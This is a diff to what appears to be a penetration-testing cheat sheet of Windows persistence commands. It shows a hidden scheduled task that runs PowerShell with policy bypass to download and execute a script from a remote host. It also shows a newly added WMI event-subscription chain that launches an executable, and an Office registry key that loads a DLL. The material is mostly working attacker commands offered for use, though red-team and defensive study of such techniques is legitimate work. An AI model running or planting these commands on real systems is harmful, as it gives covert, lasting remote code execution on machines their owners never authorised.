@@ -43,7 +43,15 @@ schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\
 
 schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30
 ```
+### WMI Persistence 
+```
 
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="service", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="service", ExecutablePath="C:\Windows\System32\pentestlab.exe",CommandLineTemplate="C:\Windows\System32\pentestlab.exe"
+
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"service\"", Consumer="CommandLineEventConsumer.Name=\"service\""
+```
 ### Office Persistence 
 ```
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\Users\KarMarKhaing\Service.dll
